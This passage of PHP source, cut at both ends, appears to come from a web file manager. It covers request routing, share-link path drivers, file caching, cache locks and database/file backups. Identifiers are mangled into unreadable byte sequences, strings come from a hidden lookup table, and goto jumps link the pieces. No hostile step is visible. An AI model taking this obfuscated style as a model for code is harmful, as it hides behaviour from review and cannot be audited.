array_push(self::$callbacks, $ƒ‚¯Ôûˆ); } public static function error($´ÙÔš÷Å) { self::$errorCallback = $´ÙÔš÷Å; } public static function haltOnMatch($Š‡µÊŠ = true) { self::$halts = $Š‡µÊŠ; } public static function dispatch() { $³“åşè =& $_SERVER[èùÙ¹Ïö]; $‚Ş°ïîõ = parse_url($_SERVER[$³“åşè[1640]], PHP_URL_PATH); $ó¤Õ­Ï« = $_SERVER[$³“åşè[162]]; $×™Œ÷¹Ö = array_keys(static::$patterns); $Æ«›ÍÔ  = array_values(static::$patterns); $Ò¹Ç‰ôÉ = !1; self::$routes = preg_replace($³“åşè[1324], $³“åşè[8], self::$routes); if (in_array($‚Ş°ïîõ, self::$routes)) { $Í¤ÍÎçƒ = array_keys(self::$routes, $‚Ş°ïîõ); foreach ($Í¤ÍÎçƒ as $Ô«è€¢í) { if (self::$methods[$Ô«è€¢í] == $ó¤Õ­Ï« || self::$methods[$Ô«è€¢í] == $³“åşè[1641] || in_array($ó¤Õ­Ï«, self::$maps[$Ô«è€¢í])) { $Ò¹Ç‰ôÉ = !0; if (!is_object(self::$callbacks[$Ô«è€¢í])) { $æö¡É­‰ = explode($³“åşè[8], self::$callbacks[$Ô«è€¢í]); $—¥ùøÇ = end($æö¡É­‰); $ĞÚàå‘½ = explode($³“åşè[1256], $—¥ùøÇ); $œÊÌë¨Ğ = new $ĞÚàå‘½[0](); $œÊÌë¨Ğ->{$ĞÚàå‘½[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Ô«è€¢í]); if (self::$halts) { return; } } } } } else { $Í¸Ùœæ = 0; foreach (self::$routes as $Ô«è€¢í) { if (strpos($Ô«è€¢í, $³“åşè[4]) !== !1) { $Ô«è€¢í = str_replace($×™Œ÷¹Ö, $Æ«›ÍÔ , $Ô«è€¢í); } if (preg_match($³“åşè[1642] . $Ô«è€¢í . $³“åşè[1643], $‚Ş°ïîõ, $çÆ‡êÚ“)) { if (self::$methods[$Í¸Ùœæ] == $ó¤Õ­Ï« || self::$methods[$Í¸Ùœæ] == $³“åşè[1641] || !empty(self::$maps[$Í¸Ùœæ]) && in_array($ó¤Õ­Ï«, self::$maps[$Í¸Ùœæ])) { $Ò¹Ç‰ôÉ = !0; array_shift($çÆ‡êÚ“); if (!is_object(self::$callbacks[$Í¸Ùœæ])) { $æö¡É­‰ = explode($³“åşè[8], self::$callbacks[$Í¸Ùœæ]); $—¥ùøÇ = end($æö¡É­‰); $ĞÚàå‘½ = explode($³“åşè[1256], $—¥ùøÇ); $œÊÌë¨Ğ = new $ĞÚàå‘½[0](); if (!method_exists($œÊÌë¨Ğ, $ĞÚàå‘½[1])) { echo $³“åşè[1644]; } else { call_user_func_array(array($œÊÌë¨Ğ, $ĞÚàå‘½[1]), $çÆ‡êÚ“); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Í¸Ùœæ], $çÆ‡êÚ“); if (self::$halts) { return; } } } } $Í¸Ùœæ++; } } if ($Ò¹Ç‰ôÉ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $…§À¡¢¶ =& $_SERVER[èùÙ¹Ïö]; header($_SERVER[$…§À¡¢¶[1645]] . $…§À¡¢¶[1646]); echo $…§À¡¢¶[1647]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$³“åşè[1640]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto CÜÒä°ˆ©Â; F¯…¿¦¼‚Ü: class PathDriverDriverShareItem { public function __construct($éÎ¢ÊÙ) { $this->pathParse = $éÎ¢ÊÙ; } public function __call($”è™ß¾Ï, $Ş¤ğãÂÙ) { $ìúÉÎÆÂ =& $_SERVER[èùÙ¹Ïö]; if (method_exists($this, $”è™ß¾Ï)) { return; } $É­›ÏÆğ = call_user_func_array(array($ìúÉÎÆÂ[1390], $”è™ß¾Ï), $Ş¤ğãÂÙ); $ÕìƒÃ‘² = array($ìúÉÎÆÂ[1391], $ìúÉÎÆÂ[1392], $ìúÉÎÆÂ[1393], $ìúÉÎÆÂ[1394], $ìúÉÎÆÂ[589], $ìúÉÎÆÂ[591], $ìúÉÎÆÂ[1395], $ìúÉÎÆÂ[109], $ìúÉÎÆÂ[1396], $ìúÉÎÆÂ[1397]); if (in_array($”è™ß¾Ï, $ÕìƒÃ‘²)) { $É­›ÏÆğ = $this->getPathOuter($É­›ÏÆğ); } return $É­›ÏÆğ; } public function copy($“½Ö¯îª, $¶ûù ñ‘, $ü¾É‘œ© = false, $–µî¡ = false) { return $this->copyMove($“½Ö¯îª, $¶ûù ñ‘, $ü¾É‘œ©, $_SERVER[èùÙ¹Ïö][589], $–µî¡); } public function move($õñÃãŠ, $«öÌ‰ÖÓ, $Ó¡÷Ææ = false, $Ù·Ùæ’ª = false) { return $this->copyMove($õñÃãŠ, $«öÌ‰ÖÓ, $Ó¡÷Ææ, $_SERVER[èùÙ¹Ïö][591], $Ù·Ùæ’ª); } private function copyMove($âµóõ­„, $¨ñùÌ, $„ë¢¼ó, $—¾¶‡¤¾, $Í³«æØ¢ = false) { $‰¡ÃÅüĞ =& $_SERVER[èùÙ¹Ïö]; $Ïë÷Á÷Ï = $¨ñùÌ; $â»ğ–€÷ = IO::driverMake($¨ñùÌ); if ($â»ğ–€÷->pathParse[$‰¡ÃÅüĞ[1199]]) { $¨ñùÌ = $â»ğ–€÷->pathParse[$‰¡ÃÅüĞ[1199]]; } else { $¨ñùÌ = $Ïë÷Á÷Ï; } $€–‘Ú“ê = IO::copyMove($âµóõ­„, $¨ñùÌ, $„ë¢¼ó, $—¾¶‡¤¾, $Í³«æØ¢); $€–‘Ú“ê = $this->getPathOuter($€–‘Ú“ê); return $€–‘Ú“ê; } public function pathThis($ÓçıÙÀ®) { return get_path_this($this->pathParse[$_SERVER[èùÙ¹Ïö][86]]); } public function pathFather($çÂ€˜âî) { return get_path_father($this->pathParse[$_SERVER[èùÙ¹Ïö][86]]); } public function iconvSystem($½™àÃØ¢) { return $½™àÃØ¢; } protected function infoParse($áœ¹»›Ş, $µÛôı•† = false) { $«ªâåÙ³ =& $_SERVER[èùÙ¹Ïö]; $°ü¦‘Æ– = $this->pathParse[$«ªâåÙ³[531]][$«ªâåÙ³[1223]] . $this->pathParse[$«ªâåÙ³[1216]]; if ($µÛôı•†) { $š•Ñòšó = IO::infoWithChildren($°ü¦‘Æ–); } else { $š•Ñòšó = IO::info($°ü¦‘Æ–); } $â£Â¿ş¬ = $this->pathParse[$«ªâåÙ³[531]]; return Action($«ªâåÙ³[1388])->_shareItemeParse($š•Ñòšó, $â£Â¿ş¬); } public function listAll($˜›Ù íµ) { $ª ûÅŠô =& $_SERVER[èùÙ¹Ïö]; $‰¿À®—á = IO::listAll($˜›Ù íµ); $¤º¢ĞÛ = rtrim($this->pathParse[$ª ûÅŠô[531]][$ª ûÅŠô[1223]], $ª ûÅŠô[8]); foreach ($‰¿À®—á as &$´ë Ë±ó) { $´ë Ë±ó[$ª ûÅŠô[86]] = $this->pathDriver . $ª ûÅŠô[8] . ltrim(substr($´ë Ë±ó[$ª ûÅŠô[86]], strlen($¤º¢ĞÛ)), $ª ûÅŠô[8]); } unset($´ë Ë±ó); return $‰¿À®—á; } public function listAllSimple($¼ë®›Ø , $Äöà» = false) { $¾ˆ‰ğÆ =& $_SERVER[èùÙ¹Ïö]; $ì›ÔÆÀ¬ = $this->listAll($¼ë®›Ø ); $®†¹ìÂè = $this->pathParse[$¾ˆ‰ğÆ[465]]; if (trim($®†¹ìÂè, $¾ˆ‰ğÆ[8]) == trim(get_path_father($®†¹ìÂè), $¾ˆ‰ğÆ[8])) { $Äöà» = !0; } return IO::init($¾ˆ‰ğÆ[12])->listAllSimpleMake($ì›ÔÆÀ¬, $®†¹ìÂè, $Äöà»); } public function getPathOuter($µÊ¹ËÕ¿) { $·€È±¨Ğ =& $_SERVER[èùÙ¹Ïö]; $èê°ä’ = KodIO::parse($µÊ¹ËÕ¿); if ($èê°ä’[$·€È±¨Ğ[33]] == KodIO::KOD_SHARE_ITEM) { return $èê°ä’[$·€È±¨Ğ[86]]; } $Ú¢ùÖÈÓ = KodIO::clear($µÊ¹ËÕ¿); $ò¦Ùˆİà = KodIO::clear($this->pathParse[$·€È±¨Ğ[531]][$·€È±¨Ğ[1223]]); $Æûõı• = substr($Ú¢ùÖÈÓ, strlen($ò¦Ùˆİà)); if (substr($Ú¢ùÖÈÓ, 0, strlen($ò¦Ùˆİà)) != $ò¦Ùˆİà) { return !1; } return $this->pathParse[$·€È±¨Ğ[1217]] . $·€È±¨Ğ[8] . ltrim($Æûõı•, $·€È±¨Ğ[8]); } public function getType() { $ë ö¬·× =& $_SERVER[èùÙ¹Ïö]; $õå¨íªê = str_replace($ë ö¬·×[76], $ë ö¬·×[12], get_class($this)); return strtolower($õå¨íªê); } public function isTypeObject($åèÈäÔú) { return IO::isTypeObject($åèÈäÔú); } public function info($àÕúĞş¤) { return $this->infoParse($àÕúĞş¤); } public function infoAuth($Üİ¸İŠø) { return $this->infoParse($Üİ¸İŠø); } public function infoWithChildren($‰Í“Îí) { return $this->infoParse($‰Í“Îí, !0); } public function infoFull($î–Ö«ûÊ) { return $this->infoParse($î–Ö«ûÊ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÆµØ· û) { $this->pathParse = $ÆµØ· û; } protected function infoParse($¡½Œå°», $ß¼Ö±”¥ = false) { $ñ›¸„Â =& $_SERVER[èùÙ¹Ïö]; return Action($ñ›¸„Â[1222])->sharePathInfo($this->pathParse[$ñ›¸„Â[86]], !0, $ß¼Ö±”¥); } public function listPath($§á’Áá, $şêÜÒ¦‚ = false) { $Ó÷ø±ıÌ =& $_SERVER[èùÙ¹Ïö]; $òğø´ƒ± = IO::listPath($§á’Áá, $şêÜÒ¦‚); if (!$òğø´ƒ±) { return $òğø´ƒ±; } if (is_array($òğø´ƒ±[$Ó÷ø±ıÌ[1389]])) { $¿˜öšˆò = Action($Ó÷ø±ıÌ[1398])->parsePathChildren($òğø´ƒ±[$Ó÷ø±ıÌ[1389]], array($Ó÷ø±ıÌ[465] => $§á’Áá)); $òğø´ƒ±[$Ó÷ø±ıÌ[1389]] = Action($Ó÷ø±ıÌ[1222])->shareItemInfo($¿˜öšˆò); } foreach ($òğø´ƒ± as $å—½ÎÔ => $Á®˜ñ¿·) { if (!in_array($å—½ÎÔ, array($Ó÷ø±ıÌ[85], $Ó÷ø±ıÌ[84]))) { continue; } foreach ($Á®˜ñ¿· as $İ² •Ü => $¿˜öšˆò) { $¿˜öšˆò = Action($Ó÷ø±ıÌ[1398])->parsePathChildren($¿˜öšˆò, array($Ó÷ø±ıÌ[465] => $§á’Áá)); $òğø´ƒ±[$å—½ÎÔ][$İ² •Ü] = Action($Ó÷ø±ıÌ[1222])->shareItemInfo($¿˜öšˆò); } } return $òğø´ƒ±; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ÙëÏùÚæ) { parent::__construct($ÙëÏùÚæ); } } goto AÛóÇ ÅÕ™; fáÌ×…ßœ¬: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($È†ù¡‹ï, $¦«Ã¹êŠ) { $ÇšÍ”¶¨ =& $_SERVER[èùÙ¹Ïö]; $this->cachePath = $È†ù¡‹ï[$ÇšÍ”¶¨[86]]; $this->prefix = $ÇšÍ”¶¨[875]; $this->cacheTime = $¦«Ã¹êŠ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ì›®›¢”) { $‚ºÕ›É¬ =& $_SERVER[èùÙ¹Ïö]; $ì›®›¢” = str_replace(array($‚ºÕ›É¬[876], $‚ºÕ›É¬[99], $‚ºÕ›É¬[75]), $‚ºÕ›É¬[877], $ì›®›¢”); return $this->cachePath . $‚ºÕ›É¬[878] . $ì›®›¢” . $‚ºÕ›É¬[879]; } public function set($³†£ìÓ, $Ùšˆ¤Ò¨, $ÖÊ¶îˆ¹ = false) { $ÖÊ¶îˆ¹ = $ÖÊ¶îˆ¹ ? $ÖÊ¶îˆ¹ : $this->cacheTime; $êú­çí„ = $this->getFile($³†£ìÓ); if (file_put_contents($êú­çí„, $this->prefix . $Ùšˆ¤Ò¨, LOCK_EX)) { @touch($êú­çí„, intval(time() + $ÖÊ¶îˆ¹)); clearstatcache(); return !0; } @unlink($êú­çí„); return !1; } public function get($¤êııÃó) { $‰…Ø – = $this->getFile($¤êııÃó); if (file_exists($‰…Ø –) && filemtime($‰…Ø –) < time()) { @unlink($‰…Ø –); return !1; } $äŒŸ‘•  = @file_get_contents($‰…Ø –); return substr($äŒŸ‘• , strlen($this->prefix)); } public function remove($Ï¥µï¸ ) { $¾ˆ×³Á = $this->getFile($Ï¥µï¸ ); return @unlink($¾ˆ×³Á); } public function deleteAll() { $¹ûÏïüñ =& $_SERVER[èùÙ¹Ïö]; $äùÓ‡ = scandir($this->cachePath); foreach ($äùÓ‡ as $è‡í¬×Ã) { $ô•³ïÂ = $this->cachePath . $è‡í¬×Ã; if (strpos($ô•³ïÂ, $¹ûÏïüñ[879]) && strpos($ô•³ïÂ, $¹ûÏïüñ[880])) { @unlink($ô•³ïÂ); } } } public function clearTimeout() { $‡“¦Õ—ú =& $_SERVER[èùÙ¹Ïö]; $Îµ¦ä²İ = scandir($this->cachePath); foreach ($Îµ¦ä²İ as $çÓÕ·Ûœ) { $“¢ÉÀò = $this->cachePath . $çÓÕ·Ûœ; if (strpos($“¢ÉÀò, $‡“¦Õ—ú[879]) && strpos($“¢ÉÀò, $‡“¦Õ—ú[880]) && filemtime($“¢ÉÀò) < time()) { @unlink($“¢ÉÀò); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¡Ö“ù‹² =& $_SERVER[èùÙ¹Ïö]; if (self::$handle) { return self::$handle; } $×Á•¼™õ = $GLOBALS[$¡Ö“ù‹²[6]][$¡Ö“ù‹²[395]]; self::$timeout = $×Á•¼™õ[$¡Ö“ù‹²[881]] ? $×Á•¼™õ[$¡Ö“ù‹²[881]] : 10; $ó˜âÅâÂ = _get($GLOBALS[$¡Ö“ù‹²[6]], $¡Ö“ù‹²[882]); $‚¢„µµï = $×Á•¼™õ[$¡Ö“ù‹²[867]] ? $×Á•¼™õ[$¡Ö“ù‹²[867]] : $¡Ö“ù‹²[216]; if ($‚¢„µµï == $¡Ö“ù‹²[21] && $ó˜âÅâÂ == $¡Ö“ù‹²[13]) { $‚¢„µµï = $¡Ö“ù‹²[216]; } switch ($‚¢„µµï) { case $¡Ö“ù‹²[870]: self::$handle = new CacheLockRedis(); break; case $¡Ö“ù‹²[871]: self::$handle = new CacheLockMemcached(); break; case $¡Ö“ù‹²[21]: self::$handle = new CacheLockDatabase(); break; case $¡Ö“ù‹²[216]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¡Ö“ù‹²[883], $¡Ö“ù‹²[884]); } return self::$handle; } private static function key($ì‘úü‡İ) { return $_SERVER[èùÙ¹Ïö][885] . Cache::key($ì‘úü‡İ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ò¼ÂÁ„ = '') { self::$errorMsg = $ò¼ÂÁ„; } public static function lockGlobal($¾ŠÂàÔ«, $›ËÇ‘İ²) { return self::lock($¾ŠÂàÔ«, $›ËÇ‘İ², !0); } public static function lock($è±äŠ», $ÊÖ‰¯¶ = false, $•ÑÇåú = false) { $é†µ¯ø =& $_SERVER[èùÙ¹Ïö]; $Ö‡¼‚„€ = self::init(); $›òˆÒİÄ = self::key($è±äŠ»); $ÊÖ‰¯¶ = $ÊÖ‰¯¶ ? $ÊÖ‰¯¶ : self::$timeout; $ÀÔ¾Ñó = timeFloat(); $ë¿¿¡óÆ = $Ö‡¼‚„€->lock($›òˆÒİÄ, $ÊÖ‰¯¶); $ñÄ£Í‘Â = timeFloat(); if (!$ë¿¿¡óÆ) { $æ¢ˆ´“ = "\x6c\x6f\x63\153\x20\x65\x72\162\157\162\73\153\145\171\75{$è±äŠ»}\x3b\x74\x69\155\x65\x3d{$ÊÖ‰¯¶}\73" . self::$errorMsg . $é†µ¯ø[73] . get_caller_msg(); $Óì“Î¿î = LNG($é†µ¯ø[886]) . "\x28{$ÊÖ‰¯¶}\x73\51\x2e" . LNG($é†µ¯ø[887]); $Óì“Î¿î .= $é†µ¯ø[888]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Óì“Î¿î = $Óì“Î¿î . $é†µ¯ø[889] . self::$errorMsg; } write_log($é†µ¯ø[890] . sprintf($é†µ¯ø[891], timeFloat() - $ÀÔ¾Ñó) . $é†µ¯ø[892] . $æ¢ˆ´“ . $é†µ¯ø[893] . error_get_last(), $é†µ¯ø[884]); show_json($Óì“Î¿î, !1); } if (!$•ÑÇåú) { self::$lockItem[$›òˆÒİÄ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $™¼ƒı£â = number_format(timeFloat() - $ñÄ£Í‘Â, 3); write_log($é†µ¯ø[894] . $è±äŠ» . $é†µ¯ø[895] . $™¼ƒı£â, $é†µ¯ø[884]); } return $ë¿¿¡óÆ; } public static function lockGet($ø·ü¦¤ş) { $ı¬—ã‹á = self::key($ø·ü¦¤ş); if (self::$lockItem[$ı¬—ã‹á]) { return self::$lockItem[$ı¬—ã‹á]; } return self::init()->lockGet($ı¬—ã‹á); } public static function unlock($Îîô‡ÉŠ) { $‚êÁ‰½ƒ =& $_SERVER[èùÙ¹Ïö]; $Ïááßíê = self::key($Îîô‡ÉŠ); self::$lockItem[$Ïááßíê] = null; self::init()->unlock($Ïááßíê); if (GLOBAL_DEBUG_LOG_ALL) { write_log($‚êÁ‰½ƒ[896] . $Îîô‡ÉŠ, $‚êÁ‰½ƒ[884]); } return; } public static function unlockRuntime() { $•Æêßú =& $_SERVER[èùÙ¹Ïö]; $Ç³ğ¡ê = self::init(); $ÍÛßû™‹ = !1; foreach (self::$lockItem as $ĞÉ©šóò => $‹ÎÕ’Ìà) { if (!$‹ÎÕ’Ìà) { continue; } $Ç³ğ¡ê->unlock($ĞÉ©šóò); if (!$ÍÛßû™‹) { $ÍÛßû™‹ = !0; write_log($•Æêßú[897] . $ĞÉ©šóò . $•Æêßú[73] . get_caller_msg(), $•Æêßú[884]); continue; } write_log($•Æêßú[897] . $ĞÉ©šóò, $•Æêßú[884]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ù»àÅ‚Ã = number_format(timeFloat() - TIME_FLOAT, 3); write_log($•Æêßú[898] . $Ù»àÅ‚Ã . $•Æêßú[899] . ACTION, $•Æêßú[884]); } } public static function fileLock($‚Ê¸ş¹÷) { $òÁ¶ŸÃÜ =& $_SERVER[èùÙ¹Ïö]; if (!$GLOBALS[$òÁ¶ŸÃÜ[900]]) { $GLOBALS[$òÁ¶ŸÃÜ[900]] = array(); } $GLOBALS[$òÁ¶ŸÃÜ[900]][$‚Ê¸ş¹÷] = !1; $÷š“ü•¯ = fopen(DATA_PATH . $‚Ê¸ş¹÷ . $òÁ¶ŸÃÜ[901], $òÁ¶ŸÃÜ[902]); if (!$÷š“ü•¯) { return !1; } $GLOBALS[$òÁ¶ŸÃÜ[900]][$‚Ê¸ş¹÷] = $÷š“ü•¯; if (flock($÷š“ü•¯, LOCK_EX)) { return !0; } self::unlock($‚Ê¸ş¹÷); show_json($òÁ¶ŸÃÜ[903], !1); return !1; } public static function fileUnlock($ØĞÏÜĞ·) { $ İ‘àÉ› =& $_SERVER[èùÙ¹Ïö]; $µš”¤Ã = $GLOBALS[$ İ‘àÉ›[900]][$ØĞÏÜĞ·]; if (!$µš”¤Ã) { return; } $GLOBALS[$ İ‘àÉ›[900]][$ØĞÏÜĞ·] = !1; flock($µš”¤Ã, LOCK_UN); fclose($µš”¤Ã); } public static function fileUnlockAll() { $Êøè‰ôĞ =& $_SERVER[èùÙ¹Ïö]; if (!$GLOBALS[$Êøè‰ôĞ[900]]) { return; } foreach ($GLOBALS[$Êøè‰ôĞ[900]] as $ã«ğâ«¹ => $Û®¿ø™’) { if (!$Û®¿ø™’) { continue; } $GLOBALS[$Êøè‰ôĞ[900]][$ã«ğâ«¹] = !1; flock($Û®¿ø™’, LOCK_UN); fclose($Û®¿ø™’); } $GLOBALS[$Êøè‰ôĞ[900]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto D¬ØšùãÊœ; E·—²½²•¹: class BackupDbFile { public function __construct() { } public function index() { $„õĞõ³ =& $_SERVER[èùÙ¹Ïö]; $ºõÄä¥ = Backup::get(); $ßêŒ°øº = $ºõÄä¥[$„õĞõ³[32]]; $Ğ»å•ê = $this->tmpFilesPath() . "\x62\141\x63\153\165\160\x5f{$ßêŒ°øº}\x2f"; $ğ™¢œ¦² = $this->backupPath($ºõÄä¥); if (!($ğ™¢œ¦² = IO::mkdir($ğ™¢œ¦²))) { return !1; } $Œé¡Ó…€ = IO::listPath($Ğ»å•ê); $æ§²š²Û = isset($Œé¡Ó…€[$„õĞõ³[85]]) ? $Œé¡Ó…€[$„õĞõ³[85]] : array(); $Ø½¾Ÿ‹Ø = array_sum(array_column($æ§²š²Û, $„õĞõ³[78])); if (!$Ø½¾Ÿ‹Ø) { return !1; } $öŠÃ‡ï = array($„õĞõ³[838] => $Ø½¾Ÿ‹Ø, $„õĞõ³[839] => time()); Backup::set($öŠÃ‡ï); $ğê•›Áø = new TaskFileTransfer($„õĞõ³[840], $„õĞõ³[820], count($æ§²š²Û), LNG($„õĞõ³[821]) . $„õĞõ³[432] . LNG($„õĞõ³[823]) . $„õĞõ³[841]); $ğê•›Áø->task[$„õĞõ³[803]] = $Ø½¾Ÿ‹Ø; foreach ($Œé¡Ó…€[$„õĞõ³[85]] as $ê‘î¤î) { $”ÚĞà®µ = IO::move($ê‘î¤î[$„õĞõ³[86]], $ğ™¢œ¦²); if (!$”ÚĞà®µ) { $ğê•›Áø->end(); $··ç®Å“ = IO::getLastError($„õĞõ³[842] . $ê‘î¤î[$„õĞõ³[86]] . $„õĞõ³[843] . $ğ™¢œ¦² . $„õĞõ³[167]); write_log($··ç®Å“, $„õĞõ³[820]); return !1; } } $¿µ·³¸½ = new DbManage(); $¾ÑÀàïÓ = $¿µ·³¸½->getSqlFile(); if (!$¾ÑÀàïÓ[$„õĞõ³[844]] || !$¾ÑÀàïÓ[$„õĞõ³[13]]) { return !1; } IO::move($¾ÑÀàïÓ[$„õĞõ³[844]], $ğ™¢œ¦²); IO::move($¾ÑÀàïÓ[$„õĞõ³[13]], $ğ™¢œ¦²); $ğê•›Áø->end(); $öŠÃ‡ï = array($„õĞõ³[845] => $Ø½¾Ÿ‹Ø, $„õĞõ³[846] => time()); Backup::set($öŠÃ‡ï); return !0; } private function backupPath($ì£á—›İ) { $ÀÙ¯“±Ã =& $_SERVER[èùÙ¹Ïö]; $ó„™šÂ³ = $ì£á—›İ[$ÀÙ¯“±Ã[32]]; $“‘Ñ‚˜ = Model($ÀÙ¯“±Ã[810])->get($ÀÙ¯“±Ã[811]); $ê‰³à×ı = substr(md5($ÀÙ¯“±Ã[812] . $“‘Ñ‚˜ . $ó„™šÂ³), 0, 8); return "\173\151\157\x3a{$ì£á—›İ[$ÀÙ¯“±Ã[791]]}\x7d\x2f\x64\x61\x74\141\142\141\x73\145\57\x62\x61\143\x6b\165\x70\57" . $ó„™šÂ³ . $ÀÙ¯“±Ã[11] . $ê‰³à×ı; } private function tmpFilesPath() { $¶ƒø¸• =& $_SERVER[èùÙ¹Ïö]; $çåçÃ¸Ä = TEMP_FILES; if ($GLOBALS[$¶ƒø¸•[6]][$¶ƒø¸•[91]][$¶ƒø¸•[836]]) { $çåçÃ¸Ä = $GLOBALS[$¶ƒø¸•[6]][$¶ƒø¸•[91]][$¶ƒø¸•[836]]; if (!mk_dir($çåçÃ¸Ä) || !is_writable($çåçÃ¸Ä) || !IO::mkfile($çåçÃ¸Ä . $¶ƒø¸•[837])) { $çåçÃ¸Ä = TEMP_FILES; } } return $çåçÃ¸Ä; } } class BackupFile { public function __construct() { } public function index() { $Óğ‡˜è = Backup::get(); $­¢Üˆƒ = $Óğ‡˜è[$_SERVER[èùÙ¹Ïö][339]][$_SERVER[èùÙ¹Ïö][216]][$_SERVER[èùÙ¹Ïö][511]]; $Ê•¬¨èÑ = array($_SERVER[èùÙ¹Ïö][512] => array($_SERVER[èùÙ¹Ïö][847], $­¢Üˆƒ), $_SERVER[èùÙ¹Ïö][848] => array($_SERVER[èùÙ¹Ïö][377], $Óğ‡˜è[$_SERVER[èùÙ¹Ïö][791]])); $§ª¾Ææá = (int) Model($_SERVER[èùÙ¹Ïö][829])->where($Ê•¬¨èÑ)->count($_SERVER[èùÙ¹Ïö][511]); $¦€õÜœŠ = (int) Model($_SERVER[èùÙ¹Ïö][829])->where($Ê•¬¨èÑ)->sum($_SERVER[èùÙ¹Ïö][78]); $ÉŠ˜éî = new TaskFileTransfer($_SERVER[èùÙ¹Ïö][849], $_SERVER[èùÙ¹Ïö][820], $§ª¾Ææá, LNG($_SERVER[èùÙ¹Ïö][821]) . $_SERVER[èùÙ¹Ïö][822] . LNG($_SERVER[èùÙ¹Ïö][850])); $ÉŠ˜éî->task[$_SERVER[èùÙ¹Ïö][803]] = $¦€õÜœŠ; $Ú—¯Å›Â = array($_SERVER[èùÙ¹Ïö][851] => $§ª¾Ææá, $_SERVER[èùÙ¹Ïö][852] => $¦€õÜœŠ, $_SERVER[èùÙ¹Ïö][853] => time()); Backup::set($Ú—¯Å›Â); $š®°ë”ş = !0; $İ…ğçµË = $this->storeIds(); $ë†à«¨Ô = 1; $ùÖãÓÆ¸ = 1000; $ƒ÷§ï‚ = $¬­ÏØ¨“ = 0; $é£º„ÕÙ = array(); $÷íõÔâú = $ÉÑ½ƒÉ = 0; do { $ß–ö”¼‹ = $_SERVER[èùÙ¹Ïö][854]; $Úü˜» = Model($_SERVER[èùÙ¹Ïö][829])->where($Ê•¬¨èÑ)->field($ß–ö”¼‹)->order($_SERVER[èùÙ¹Ïö][855])->selectPage($ùÖãÓÆ¸, $ë†à«¨Ô); $Ğ“Ô’ûå = !empty($Úü˜»[$_SERVER[èùÙ¹Ïö][415]]) ? $Úü˜»[$_SERVER[èùÙ¹Ïö][415]] : array(); foreach ($Ğ“Ô’ûå as $æú„­) { if (!$this->_fileExist($æú„­, $é£º„ÕÙ, $İ…ğçµË)) { $§ª¾Ææá -= 1; $¦€õÜœŠ -= (int) $æú„­[$_SERVER[èùÙ¹Ïö][78]]; write_log("\146\151\154\x65\40\156\157\164\40\145\170\x69\x73\x74\x2e\x66\151\154\x65\x49\104\x3a{$æú„­[$_SERVER[èùÙ¹Ïö][511]]}\54\40\160\141\164\150\72{$æú„­[$_SERVER[èùÙ¹Ïö][86]]}", $_SERVER[èùÙ¹Ïö][856]); continue; } $æÛÚ·½Ö = $æú„­[$_SERVER[èùÙ¹Ïö][86]]; $”œï»Æ² = "\173\x69\x6f\72{$Óğ‡˜è[$_SERVER[èùÙ¹Ïö][791]]}\x7d" . substr($æÛÚ·½Ö, strlen("\173\151\157\x3a{$æú„­[$_SERVER[èùÙ¹Ïö][857]]}\x7d")); if (IO::exist($”œï»Æ²)) { $ÉŠ˜éî->updateFileEnd($æú„­[$_SERVER[èùÙ¹Ïö][32]], $æú„­[$_SERVER[èùÙ¹Ïö][78]]); } else { $”œï»Æ² = get_path_father($”œï»Æ²); IO::mkdir($”œï»Æ²); if (!IO::copy($æÛÚ·½Ö, $”œï»Æ², $_SERVER[èùÙ¹Ïö][858])) { write_log($_SERVER[èùÙ¹Ïö][859] . $æÛÚ·½Ö . $_SERVER[èùÙ¹Ïö][843] . $”œï»Æ² . $_SERVER[èùÙ¹Ïö][167], $_SERVER[èùÙ¹Ïö][820]); $š®°ë”ş = !1; break; } } $­¢Üˆƒ = $æú„­[$_SERVER[èùÙ¹Ïö][511]]; $¬­ÏØ¨“ += 1; $ƒ÷§ï‚ += $æú„­[$_SERVER[èùÙ¹Ïö][78]]; $ÉÑ½ƒÉ += 1; $÷íõÔâú += $æú„­[$_SERVER[èùÙ¹Ïö][78]]; if ($ƒ÷§ï‚ >= 1024 * 1024 * 100) { $Ú—¯Å›Â = array($_SERVER[èùÙ¹Ïö][860] => $­¢Üˆƒ, $_SERVER[èùÙ¹Ïö][861] => $ÉÑ½ƒÉ, $_SERVER[èùÙ¹Ïö][862] => $÷íõÔâú); Backup::set($Ú—¯Å›Â); $ƒ÷§ï‚ = $¬­ÏØ¨“ = 0; } } $…£ı÷Õ = count($Ğ“Ô’ûå); $ë†à«¨Ô++; } while ($…£ı÷Õ == $ùÖãÓÆ¸); $ÉŠ˜éî->end(); $Ú—¯Å›Â = array($_SERVER[èùÙ¹Ïö][863] => 1, $_SERVER[èùÙ¹Ïö][801] => time(), $_SERVER[èùÙ¹Ïö][815] => 1, $_SERVER[èùÙ¹Ïö][860] => $­¢Üˆƒ, $_SERVER[èùÙ¹Ïö][852] => $¦€õÜœŠ, $_SERVER[èùÙ¹Ïö][851] => $§ª¾Ææá, $_SERVER[èùÙ¹Ïö][864] => time()); if ($¬­ÏØ¨“) { $Ú—¯Å›Â[$_SERVER[èùÙ¹Ïö][861]] = $ÉÑ½ƒÉ; $Ú—¯Å›Â[$_SERVER[èùÙ¹Ïö][862]] = $÷íõÔâú; } Backup::set($Ú—¯Å›Â); $this->_fileFilter($é£º„ÕÙ); return !0; } private function _fileExist($¸İï á³, &$ğ¯îğ¡Ô, $Í°÷ıÇ©) { $¨¹®¦Àñ =& $_SERVER[èùÙ¹Ïö]; $ÄÎ÷ÃÒ¯ = $¸İï 